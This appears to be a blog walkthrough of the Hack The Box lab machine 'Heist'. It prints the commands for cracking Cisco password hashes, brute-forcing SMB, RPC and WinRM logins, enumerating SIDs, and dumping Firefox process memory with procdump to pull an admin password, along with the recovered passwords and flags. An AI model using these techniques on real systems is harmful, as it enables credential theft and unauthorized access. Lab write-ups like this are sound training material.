+++
title = "HTB - Heist"
date = 2025-01-04
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.10.149
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 21:42 EST
Stats: 0:02:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.14% done; ETC: 21:45 (0:00:00 remaining)
Nmap scan report for 10.10.10.149
Host is up (0.087s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-03T02:45:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 203.92 seconds
```

### Enumeration
We see a bit here. SMB and RPC didn't turn up much
When we visit the webserver, we find an login portal. We can bypass by logging in as a guest.
Theres an attachment on a post that yields Cisco usernames and password hashes. We can crack them with john.
More on types here: https://learningnetwork.cisco.com/s/article/cisco-routers-password-types
We can decrypt the type 5 hash with `john`: `john --wordlist=/usr/share/wordlists/rockyou.txt cisco5`
The type 7 hashesw e can decode online. Passwords are as follows:
```
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d
```
Now, flesh out user list with the names in the config, and the names on the forum posts:
```
admin
rout3r
secret
hazard
```
Cross/Brute with SMB: `nxc smb 10.10.10.149 -u users -p passwords`. Nothing here
Try again with RPC: `rpcclient -U "hazard%stealth1agent"`
We get connection, but are unable to perform enumdomgroup or enumdomusers
We can query users we already know by using `lookupnames hazard`. We can see the SID.
Let's brute the rest. We see our verified users are between 1000-1050:
`for i in {1000..1050}; do rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v unknown; done`
Now, throw the known users into a list, and brute credentials for evil-winrm:
`nxc winrm 10.10.10.149 -u users.txt -p passwords.txt`
We get a hit `Chase:Q4)sJu\Y8qz*A3?d`
Logon to evilwinrm and grab flag
USER:`5c4ff0bf9fadb53f6d6f4b8ed92ea9f2`

### Privilege Escalation
Learned something new from IppSec. Recursively search files in a given directory with: `gci -recurse . | select fullname`. 0xdf does something a bit different to parse for interesting files: `cmd /c dir /s /b /a:-d-h \Users\chase | findstr /i /v appdata`

We find a todo, but nothing much comes from it. The windows equivilent to the `/etc/apache2` or `/var/www/` which you find in linux looks to be `inetpub`. 
Searching there, we cannot list all files, but if we go back to the website, we can query for specific files like `login.php`
When we do this, we find a hardcoded admin SHA256 hash. When we try to crack, nothing.
We keep exploring the front end of the website to see what we can find on the backend, and we see a `attachments` dir.
We can list files here, and see a config file. It's the same we saw before.
Moving on, some pretty cool stuff here. So, we can use `Get-Process` to view everything the box has going on.
Intuitively, by looking at the todo list, and seeing the unusual process of FireFox, we can assume there is something here to explore. How else would Chase know about the issues list?
We can dump the information with a tool called `procdump`. Downloadable here https://live.sysinternals.com/
Download the file, and choose a working directory, then upload with: `upload procdump64.exe .`.
Once uploaded, run it and accept the eula: `.\procdump64.exe -accepteula`
Dump the process: `.\procdump64.exe -ma 6424`
Download the file: `download firefox.exe_250104_231116.dmp`
It'll take a fat minute, so we can use `strings` to comb through and look at interesting things like `user` or `password`
We find credentials for our admin@support.htb when we search: `strings firefox.exe_250104_231116.dmp | grep admin@support.htb`:`4dD!5}x/re8]FBuZ`
We can try and elevate privileges by adding this to our passwords file, and seeing if any account hits. Remember, the Administrator will need to be added to the userfile as well.
We get a hit!
ROOT:`a50f2868624c26068111abe402abd4d0`

